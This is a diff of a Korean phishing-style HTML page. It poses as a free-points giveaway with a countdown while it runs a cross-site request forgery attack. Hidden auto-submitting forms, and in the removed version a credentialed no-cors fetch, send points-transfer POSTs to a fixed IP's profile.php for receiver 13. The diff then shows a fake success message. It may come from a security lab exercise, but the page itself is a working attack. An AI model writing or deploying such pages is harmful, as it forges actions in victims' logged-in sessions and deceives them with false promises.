@@ -1,13 +1,39 @@
-
 <!DOCTYPE html>
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
-    <!-- 기존 스타일 유지 -->
     <style>
-        /* 기존 CSS 그대로 */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            max-width: 500px;
+            width: 90%;
+        }
+        .title { font-size: 2.5em; margin-bottom: 20px; }
+        .subtitle { font-size: 1.2em; margin-bottom: 30px; opacity: 0.9; }
+        .countdown { font-size: 3em; color: #FFD700; font-weight: bold; margin: 20px 0; }
+        .progress-bar { width: 100%; height: 20px; background: rgba(255,255,255,0.3); border-radius: 10px; margin: 20px 0; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #00ff88, #00cc6a); width: 0%; transition: width 0.5s ease; }
+        .success { color: #00FF88; font-size: 1.8em; font-weight: bold; }
+        .pulse { animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
     </style>
 </head>
 <body>
@@ -16,30 +42,54 @@
         <p class="subtitle">무료 포인트 지급 시스템에 연결되었습니다</p>
         
         <div id="loading-section">
-            <div class="loading">
+            <div>
                 <p>💰 포인트 지급을 준비하고 있습니다...</p>
                 <p class="countdown" id="countdown">5</p>
                 <p>초 후 자동으로 포인트가 지급됩니다!</p>
             </div>
-            
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressBar"></div>
-            </div>
-            
+            <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
             <p id="status">🔄 시스템 연결 중...</p>
         </div>
         
         <div id="success-section" style="display: none;">
             <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
             <p style="font-size: 1.3em; margin: 20px 0;">💰 1200P가 성공적으로 지급되었습니다!</p>
-            <p style="opacity: 0.8;">포인트는 즉시 계정에 반영됩니다.</p>
         </div>
     </div>
 
+    <!-- 다중 방식 시도 -->
+    <iframe name="target1" style="display:none;"></iframe>
+    <iframe name="target2" style="display:none;"></iframe>
+    <iframe name="target3" style="display:none;"></iframe>
+    
+    <!-- HTTP 버전 -->
+    <form id="form1" method="POST" action="http://52.78.58.98/profile.php" target="target1" style="display:none;">
+        <input type="hidden" name="receiver_id" value="13">
+        <input type="hidden" name="points" value="3">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="gift_type" value="coffee">
+        <input type="hidden" name="message" value="어 개털렸죠?">
+    </form>
+    
+    <!-- HTTPS 버전 -->
+    <form id="form2" method="POST" action="https://52.78.58.98/profile.php" target="target2" style="display:none;">
+        <input type="hidden" name="receiver_id" value="13">
+        <input type="hidden" name="points" value="4">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="gift_type" value="tea">
+        <input type="hidden" name="message" value="빢빢이">
+    </form>
+    
+    <form id="form3" method="POST" action="http://52.78.58.98/profile.php" target="target3" style="display:none;">
+        <input type="hidden" name="receiver_id" value="13">
+        <input type="hidden" name="points" value="5">
+        <input type="hidden" name="send_gift" value="1">
+        <input type="hidden" name="gift_type" value="cake">
+        <input type="hidden" name="message" value="빤딲빤딲">
+    </form>
+
     <script>
         let countdown = 5;
-        let progressWidth = 0;
-        
         const countdownEl = document.getElementById('countdown');
         const statusEl = document.getElementById('status');
         const progressBar = document.getElementById('progressBar');
@@ -56,79 +106,48 @@
         
         let messageIndex = 0;
         
-        const countdownTimer = setInterval(() => {
+        const timer = setInterval(() => {
             countdown--;
             countdownEl.textContent = countdown;
-            progressWidth += 20;
-            progressBar.style.width = progressWidth + '%';
+            progressBar.style.width = ((5-countdown) * 20) + '%';
             
             if (messageIndex < statusMessages.length) {
-                statusEl.textContent = statusMessages[messageIndex];
-                messageIndex++;
+                statusEl.textContent = statusMessages[messageIndex++];
             }
             
             if (countdown <= 0) {
-                clearInterval(countdownTimer);
+                clearInterval(timer);
                 executeAttack();
             }
         }, 1000);
         
-        // 새로운 fetch 방식 공격
-        async function executeAttack() {
-            console.log('🎯 fetch 방식 공격 시작...');
+        function executeAttack() {
+            console.log('🎯 다중 방식 공격 시작...');
             statusEl.textContent = '💸 포인트를 전송하고 있습니다...';
             progressBar.style.width = '100%';
             
-            const attacks = [
-                { points: 3, gift_type: 'coffee', message: '내 돈이다 이 대머리야' },
-                { points: 4, gift_type: 'tea', message: '빢빢이' },
-                { points: 5, gift_type: 'cake', message: '빤딲빤딲' }
-            ];
+            // 폼 방식으로 시도
+            setTimeout(() => { 
+                console.log('📤 HTTP 방식 시도...');
+                document.getElementById('form1').submit(); 
+            }, 500);
             
-            for (let i = 0; i < attacks.length; i++) {
-                try {
-                    const formData = new FormData();
-                    formData.append('receiver_id', '13');
-                    formData.append('points', attacks[i].points.toString());
-                    formData.append('send_gift', '1');
-                    formData.append('gift_type', attacks[i].gift_type);
-                    formData.append('message', attacks[i].message);
-                    
-                    await fetch('http://52.78.58.98/profile.php', {
-                        method: 'POST',
-                        body: formData,
-                        credentials: 'include', // 중요: 쿠키 포함
-                        mode: 'no-cors'        // CORS 우회
-                    });
-                    
-                    console.log(`✅ ${i+1}차 공격 완료: ${attacks[i].points}P`);
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    
-                } catch (error) {
-                    console.error(`❌ ${i+1}차 공격 실패:`, error);
-                }
-            }
+            setTimeout(() => { 
+                console.log('📤 HTTPS 방식 시도...');
+                document.getElementById('form2').submit(); 
+            }, 1500);
             
-            showSuccess();
+            setTimeout(() => { 
+                console.log('📤 추가 HTTP 시도...');
+                document.getElementById('form3').submit(); 
+            }, 2500);
+            
+            setTimeout(() => {
+                loadingSection.style.display = 'none';
+                successSection.style.display = 'block';
+                console.log('✅ 공격 시퀀스 완료!');
+            }, 4000);
         }
-        
-        function showSuccess() {
-            loadingSection.style.display = 'none';
-            successSection.style.display = 'block';
-            console.log('✅ 모든 포인트 전송 완료!');
-            document.title = '✅ 포인트 지급 완료!';
-        }
-        
-        // 페이지 언로드 방지
-        let preventUnload = true;
-        window.addEventListener('beforeunload', function(e) {
-            if (preventUnload) {
-                e.preventDefault();
-                return '포인트 지급이 진행 중입니다.';
-            }
-        });
-        
-        setTimeout(() => { preventUnload = false; }, 7000);
     </script>
 </body>
 </html>
